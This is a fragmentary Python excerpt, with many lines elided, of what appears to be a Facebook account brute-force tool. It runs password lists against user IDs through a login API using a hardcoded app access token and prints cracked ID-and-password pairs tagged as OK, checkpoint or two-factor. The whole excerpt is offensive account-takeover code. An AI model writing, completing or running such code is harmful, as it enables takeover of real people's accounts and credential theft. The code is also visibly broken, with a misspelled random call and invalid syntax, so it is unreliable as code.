...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        jazoest = li2+j1
                        data = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                                 'sdk_version': f"{str(random.radint(1,26))}",
                                 'email': em,
                                 'locale': 'en_US', 
                                 'password': pas, 
                                 'sdk': 'andriod', 
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AXB-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [AXB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [AXB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
